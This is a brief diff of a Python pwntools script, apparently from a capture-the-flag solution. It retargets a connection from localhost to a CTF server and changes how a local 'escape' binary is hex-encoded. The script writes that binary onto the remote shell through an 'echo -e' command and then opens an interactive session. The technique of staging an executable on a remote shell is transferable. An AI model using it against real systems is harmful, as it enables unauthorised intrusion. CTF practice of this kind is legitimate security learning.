@@ -1,16 +1,11 @@
 from pwn import *
 
-def chunks(lst, n):
-    """Yield successive n-sized chunks from lst."""
-    for i in range(0, len(lst), n):
-        yield lst[i:i + n]
-
-conn = remote('127.0.0.1', 31337)
+conn = remote('solitary.ctf.secso.cc', 31337)
 
 with open('./escape', 'rb') as f:
-    hex = f.read().hex()
-    f_str = "".join([("\\x" + "".join(digits)) for digits in chunks(hex, 2)])
+    so = f.read()
+    so_str = "".join(["\\" + hex(byte)[1:] for byte in so])
 
-    conn.send(b"echo -e -n '" + f_str.encode() + b"' > ./escape\n")
+    conn.send(b"echo -e -n '" + so_str.encode() + b"' > ./escape\n")
 
 conn.interactive()
